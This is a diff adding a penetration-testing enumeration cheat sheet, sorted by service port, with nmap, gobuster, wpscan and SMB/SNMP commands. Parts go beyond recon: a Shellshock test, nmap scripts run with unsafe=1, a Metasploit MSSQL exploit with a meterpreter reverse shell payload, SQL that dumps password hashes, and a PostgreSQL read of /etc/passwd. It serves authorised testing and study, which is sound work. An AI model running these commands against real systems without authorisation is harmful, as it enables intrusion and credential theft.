@@ -1,0 +1,470 @@
+# Begin by Vulnerability Scanning
+
+Begin with an Advanced Scan
+set targets/range
+Schedule it to begin immediately once engagement begins
+Set ALL ports to scan (1-65535)
+Ensure Web App are scanned (check other Assessments as well)
+May take a while depending on size of scope
+
+# Port Scanning
+
+sudo masscan -p1-65535,U:1-65535 $IPADDRESS/RANGE --rate=1000 > Masscan$IPADDRESS/RANGE.txt
+
+sudo nmap -sU -sT -p0-65535 $IPADDRESS/RANGE > Nmap$IPADDRESS/RANGE.txt
+
+sudo nmap -sT -sU -sV -p0-65535 --script=vuln $IPADDRESS/RANGE > Nmap$IPADDRESS/RANGEvulns.txt
+
+# Full TCP port scan
+sudo nmap -Pn -p- -oN alltcp_ports.txt $ip
+
+# Full TCP port scan (safe scripts + version detection)
+sudo nmap -Pn -sC -sV -p- -oN alltcp.txt $ip
+
+# Top 20 UDP port scan
+sudo nmap -Pn -sU -sV -sC --top-ports=20 -oN top_20_udp_nmap.txt $ip
+
+AutoRecon
+
+# Scan single target
+sudo autorecon -o enumeration $ip
+
+# Scan multiple targets
+sudo autorecon -o enumeration $ip1 $ip2 $ip3 $ip4
+
+# Fingerprinting and Banner Grabbing
+
+nc -v IPADDRESS Port
+Telnet IPADDRESS Port
+
+
+# FTP Enumeration (Port 21)
+
+nmap -p 21 --script=ftp* -oN ftp$IPADDRESS.txt 
+
+nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 > ftp$IPADDRESS.txt 
+
+# Version detection + NSE scripts
+nmap -Pn -sV -p 21 --script="banner,(ftp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "tcp_21_ftp_nmap.txt" $ip
+
+
+# SSH Enumeration (Port 22)
+
+nc -vn $IPADDRESS 22
+
+nmap -p22 $IPADDRESS -sC 
+
+nmap -p22 $IPADDRESS -sV 
+
+nmap -p22 $IPADDRESS --script ssh2-enum-algos 
+
+nmap -p22 $IPADDRESS --script ssh-hostkey --script-args ssh_hostkey=full 
+
+nmap -p22 $IPADDRESS --script ssh-auth-methods --script-args="ssh.user=root" 
+
+# Version detection + NSE scripts
+nmap -Pn -sV -p 22 --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -oN tcp_22_ssh_nmap.txt $ip
+
+
+# SMTP Enumeration (Port 25)
+
+nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $IPADDRESS 
+
+nc -nvv $IPADDRESS 25
+
+telnet $IPADDRESS 25
+
+# Version detection + NSE scripts
+nmap -Pn -sV -p 25 "--script=banner,(smtp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN tcp_25_smtp_nmap.txt $ip
+
+/home/kali/.local/bin/smtp-user-enum -V -m RCPT -w -f '<user@example.com>' -d 'domain.local' -U "/usr/share/metasploit-framework/data/wordlists/unix_users.txt" $ip 25 2>&1 | tee "tcp_25_smtp_user-enum.txt"
+
+
+# DNS Enumeration
+
+nmap -sC -sV -p53 OPADDRESS.0/24
+https://whois.domaintools.com/
+https://pentest-tools.com/information-gathering/find-subdomains-of-domain
+https://dnsdumpster.com/
+dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt
+
+# Version detection + NSE scripts
+sudo nmap -Pn -sU -sV -p 53 "--script=banner,(dns* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN udp_53_dns_nmap.txt $ip
+
+
+# DNS Zone Transfer
+
+dig axfr WEBSITE.com @ns1.WEBSITE.com
+
+# Perform zone transfer (only works over port 53/tcp)
+dig axfr @$ip $domain 2>&1 | tee "tcp_53_dns_dig.txt"
+
+# Perform reverse DNS lookup (may display NS record containing domain name)
+nslookup $ip $ip
+
+# Brute force subdomains
+gobuster dns -d $domain -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 16 -o "tcp_53_dns_gobuster.txt"
+
+
+# Web Enumeration (80/443)
+
+curl -I $url
+
+cewl $url/index.php -m 3 --with-numbers -w cewl.txt
+
+python3 drupwn --version 7.28 --mode enum --target $url
+
+droopescan scan drupal -u $url
+
+dirb http://$IPADDRESS/
+
+nikto –h $IPADDRESS
+
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://IPADDRESS/FUZZ 
+
+# Version detection + NSE scripts
+nmap -Pn -sV -p $port "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" -oN tcp_port_protocol_nmap.txt $ip
+
+nikto -h $url 2>&1 | tee "tcp_port_protocol_nikto.txt"
+
+gobuster dir -u $url -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -s "200,204,301,302,307,403,500" -k -t 16 -o "tcp_port_protocol_gobuster.txt"  
+
+python3 /opt/dirsearch/dirsearch.py -u $url -t 16 -e txt,html,php,asp,aspx,jsp -f -x 403 -w /usr/share/seclists/Discovery/Web-Content/common.txt --plain-text-report="tcp_port_protocol_dirsearch.txt"
+
+Dirbuster (GUI): only perform extension brute force - disable 'Brute Force Dirs'
+
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -t 16 $url/FUZZ 2>&1 | tee "tcp_port_http_wfuzz.txt"
+
+# Directory brute force recursively with max depth = 2
+python3 /opt/dirsearch/dirsearch.py -u $url/apps/ -t 16 -e txt,html,php -f -x 403 -r -R 2 -w /usr/share/seclists/Discovery/Web-Content/common.txt --plain-text-report="tcp_port_protocol_dirsearch_apps.txt"
+
+whatweb --color=never --no-errors -a 3 -v $url 2>&1 | tee "tcp_port_protocol_whatweb.txt"
+
+# Enumerate vulnerable plugins and themes, timthumbs, wp-config.php backups, database exports, usernames and media IDs
+wpscan --url $url --no-update --disable-tls-checks -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee tcp_port_protocol_wpscan.txt
+
+# Enumerate all plugins
+wpscan --url $url --disable-tls-checks --no-update -e ap --plugins-detection aggressive -f cli-no-color 2>&1 | tee tcp_port_protocol_wpscan_plugins.txt
+
+# Check if bash vulnerable to CVE-2014-6271 (bash vulnerable if ‘vulnerable’ in output)
+env x='() { :;}; echo vulnerable' bash -c "echo this is a test" 
+
+# Brute force CGI files
+gobuster dir -u $url/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "cgi,sh,pl,py" -s "200,204,301,302,307,403,500" -t 16 -o "tcp_port_protocol_gobuster_shellshock.txt"
+
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/CGIs.txt --hc 404 -t 16 $url/cgi-bin/FUZZ 2>&1 | tee "tcp_port_protocol_wfuzz.txt"
+
+Webmin uses cgi files - versions up to 1.700 vulnerable to shellshock (http://www.webmin.com/security.html)
+
+Sub-Domain Enumeration
+
+https://crt.sh/
+https://github.com/appsecco/the-art-of-subdomain-enumeration/blob/master/san_subdomain_enum.py
+./sumrecon.sh DOMAIN
+
+
+# Kerberos (88/464)
+
+# Version detection + NSE scripts
+nmap -Pn -sV -p $port --script="banner,krb5-enum-users" -oN "tcp_port_kerberos_nmap.txt" $ip
+
+# POP3/POP3S
+
+# Version detection + NSE scripts
+nmap -Pn -sV -p $port "--script=banner,(pop3* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN tcp_port_pop3_nmap.txt $ip
+
+
+# RPCBind (111)
+
+rpcinfo –p $IPADDRESS
+
+# Version detection + NSE scripts
+nmap -Pn -sV -p $port --script=banner,msrpc-enum,rpc-grind,rpcinfo -oN tcp_port_rpc_nmap.txt $ip  
+
+# List all registered RPC programs
+rpcinfo -p $ip
+
+# Provide compact results
+rpcinfo -s $ip
+
+rpcclient -U "" -N $ip
+    srvinfo
+    enumdomusers
+    getdompwinfo
+    querydominfo
+    netshareenum
+    netshareenumall
+
+# Ident (113)
+
+ident-user-enum $ip 22 25 80 445
+
+# NTP (123)
+
+# Run ntp-info NSE script
+sudo nmap -sU -p 123 --script ntp-info $ip
+
+# NetBIOS (137) 
+
+enum4linux -a -M -l -d $ip 2>&1 | tee "enum4linux.txt"
+
+nbtscan -rvh $ip 2>&1 | tee "nbtscan.txt"
+
+# SMB\RPC Enumeration (139/445)
+
+# Version detection + NSE scripts
+nmap -Pn -sV -p 445 "--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args=unsafe=1 -oN tcp_445_smb_nmap.txt $ip
+
+enum4linux –a $IPADDRESS
+
+enum4linux -a -M -l -d $ip 2>&1 | tee "enum4linux.txt"
+
+# NB: change interface tcpdump listening on
+sudo ./smbver.sh $ip 139
+
+nbtscan $IPADDRESS
+
+py $IPADDRESS 500 50000 dict.txt
+
+python /usr/share/doc/python-impacket-doc/examples/samrdump.py $IPADDRESS
+
+nmap $IPADDRESS --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse
+
+nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 $IPADDRESS.0/24   
+
+nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $IPADDRESS.0/24
+
+smbclient -L //$IPADDRESS/
+
+# List share permissions
+smbmap -H $ip -P 445 2>&1 | tee -a "smbmap-share-permissions.txt"; smbmap -u null -p "" -H $ip -P 445 2>&1 | tee -a "smbmap-share-permissions.txt"
+
+# List share contents
+smbmap -H $ip -P 445 -R 2>&1 | tee -a "smbmap-list-contents.txt"; smbmap -u null -p "" -H $ip -P 445 -R 2>&1 | tee -a "smbmap-list-contents.txt"
+
+smbmap -H $ip
+smbclient -L //$ip/ -U '' -N
+
+nmap --script smb-enum-shares -p 445 $ip
+
+smbclient \\\\$ip\\wwwroot
+
+# RRAS Service Overflow
+# https://docs.microsoft.com/en-us/security-updates/securitybulletins/2006/ms06-025
+nmap -Pn -sV -p 445 --script="smb-vuln-ms06-025" --script-args="unsafe=1" -oN "tcp_445_smb_ms06-025.txt" $ip
+
+# DNS RPC Service Overflow
+# https://docs.microsoft.com/en-us/security-updates/securitybulletins/2007/ms07-029
+nmap -Pn -sV -p 445 --script="smb-vuln-ms07-029" --script-args="unsafe=1" -oN "tcp_445_smb_ms07-029.txt" $ip
+
+# Server Service Vulnerability
+# https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067
+nmap -Pn -sV -p 445 --script="smb-vuln-ms08-067" --script-args="unsafe=1" -oN "tcp_445_smb_ms08-067.txt" $ip
+
+# Eternalblue
+# https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010    
+nmap -p 445 --script smb-vuln-ms17-010 -oN "tcp_445_smb_ms08-067.txt" $ip
+
+# MOUNT NFS
+
+Showmount -e IPADDRESS
+
+Mount -t TYPE IPADDRESS:/Path/to/share MNT/LOCATION
+
+# IMAP/IMAPS (143/993)
+
+# Version detection + NSE scripts
+nmap -Pn -sV -p $port "--script=banner,(imap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN tcp_port_imap_nmap.txt $ip  
+
+# SNMP Enumeration (161)
+
+snmpwalk -c public -v1 $IPADDRESS
+
+# Enumerate entire MIB tree
+snmpwalk -c public -v1 -t 10 $ip
+
+# Enumerate Windows users
+snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25
+
+# Enumerate running Windows processes
+snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2
+
+# Enumerate open TCP ports
+snmpwalk -c public -v1 $ip 1.3.6.1.2.1.6.13.1.3
+
+# Enumerate installed software
+snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.6.3.1.2
+
+
+snmpcheck -t $IPADDRESS -c public
+
+snmpenum -t $IPADDRESS
+
+onesixtyone -c names -i $IPADDRESS/RANGE
+
+nmap -sT -p 161 $IPADDRESS -oG snmp_results.txt
+
+# Version detection + NSE scripts
+sudo nmap -Pn -sU -sV -p 161 --script="banner,(snmp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "udp_161_snmp-nmap.txt" $ip       
+
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $ip 2>&1 | tee "udp_161_snmp_onesixtyone.txt"      
+
+# LDAP (389/3268)
+
+# Version detection + NSE scripts
+nmap -Pn -sV -p $port --script="banner,(ldap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "tcp_port_ldap_nmap.txt" $ip
+
+enum4linux -a -M -l -d $ip 2>&1 | tee "enum4linux.txt"
+
+# Java RMI (1100)
+
+# Version detection + NSE scripts
+nmap -Pn -sV -p 1100 --script="banner,rmi-vuln-classloader,rmi-dumpregistry" -oN "tcp_110_rmi_nmap.txt" $ip
+
+# MSSQL (1433)
+
+nmap -sU --script=ms-sql-info $IPADDRESS
+
+# Version detection + NSE scripts
+nmap -Pn -sV -p 1433 --script="banner,(ms-sql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args="mssql.instance-port=1433,mssql.username=sa,mssql.password=sa" -oN "tcp_1433_mssql_nmap.txt" $ip
+
+# MSSQL shell
+mssqlclient.py -db msdb hostname/sa:password@$ip
+
+# List databases
+SELECT name FROM master.dbo.sysdatabases
+
+# List tables
+SELECT * FROM <database_name>.INFORMATION_SCHEMA.TABLES
+
+# List users and password hashes
+SELECT sp.name AS login, sp.type_desc AS login_type, sl.password_hash, sp.create_date, sp.modify_date, CASE WHEN sp.is_disabled = 1 THEN 'Disabled' ELSE 'Enabled' END AS status FROM sys.server_principals sp LEFT JOIN sys.sql_logins sl ON sp.principal_id = sl.principal_id WHERE sp.type NOT IN ('G', 'R') ORDER BY sp.name   
+
+msf > use auxiliary/scanner/mssql/mssql_ping
+
+msf > use auxiliary/admin/mssql/mssql_enum
+
+msf > use exploit/windows/mssql/mssql_payload
+
+msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
+
+# Oracle (1521)
+
+nmap -p 1521 -A $IPADDRESS
+
+apt-get install oscanner  
+
+oscanner -s 192.168.1.200 -P 1521 
+
+apt-get install tnscmd10g
+
+tnscmd10g version -h $IPADDRESS
+
+tnscmd10g status -h $IPADDRESS
+
+nmap --script=oracle-tns-version 
+
+ nmap --script=oracle-sid-brute 
+
+ nmap --script=oracle-brute 
+ 
+# NFS (2049)
+
+# Version detection + NSE scripts
+nmap -Pn -sV -p 111,2049 --script="banner,(rpcinfo or nfs*) and not (brute or broadcast or dos or external or fuzzer)" -oN "tcp_111_2049_nfs_nmap.txt" $ip
+
+showmount -e $ip
+
+sudo mount -o rw,vers=2 $ip:/home /mnt
+
+# '-o nolock' used to disable file locking, needed for older NFS servers
+sudo mount -o nolock $ip:/home /mnt/
+
+# MySQL (3306)
+
+# Version detection + NSE scripts
+nmap -Pn -sV -p 3306 --script="banner,(mysql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "tcp_3306_mysql_nmap.txt" $ip
+
+mysql --host=$ip -u root -p
+
+SHOW VARIABLES;     
+
+SHOW GRANTS;
+
+# Replace 'password' field with 'authentication_string' if it does not exist
+SELECT user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv FROM mysql.user WHERE user = 'root';
+
+SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges;     
+
+SELECT user FROM mysql.user WHERE file_priv='Y';
+
+# RDP (3389)
+
+# Version detection + NSE scripts
+nmap -Pn -sV -p 3389 --script="banner,(rdp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "tcp_3389_rdp_nmap.txt" $ip
+
+# SIP (5060)
+
+Scans for SIP devices on network
+
+svmap $ip
+
+Identifies active extensions on PBX
+
+svwar -m INVITE -e 200-250 $ip
+# PostgreSQL (5432)
+
+Log into postgres remotely
+
+PGPASSWORD=postgres psql -h $ip -p 5437 -U postgres
+List databases
+
+\list
+SELECT datname FROM pg_database;
+Use postgres database
+
+\c postgres
+List tables
+
+\d
+Describe table
+
+\d table
+Check if current user superuser (on = yes, off = no)
+
+SELECT current_setting ('is_superuser');
+Get user roles
+
+\du+
+Check user’s privileges over table (pg_shadow)
+
+SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
+Read file (/etc/passwd)
+
+CREATE TABLE demo(t text);
+COPY demo FROM '/etc/passwd';
+SELECT * FROM demo;
+Read usernames and password hashes
+
+# Postgresql password hash format: md5(secret || username) where || denotes string concatenation (remove md5 before cracking hash)
+SELECT usename, passwd from pg_shadow;
+Check if plpgsql enabled
+
+# Below result indicates that plpgsql enabled:
+# lanname | lanacl
+#---------+---------
+# plpgsql |            
+SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql'
+PostgreSQL config file location
+
+SHOW config_file;
+
+# VNC (5900)
+
+# Version detection + NSE scripts
+nmap -Pn -sV -p 5900 --script="banner,(vnc* or realvnc* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args="unsafe=1" -oN "tcp_5900_vnc_nmap.txt" $ip
+
+# AJP (8009)
+
+# Version detection + NSE scripts
+nmap -Pn -sV -p 8009 -n --script ajp-auth,ajp-headers,ajp-methods,ajp-request -oN tcp_8009_ajp_nmap.txt $ip
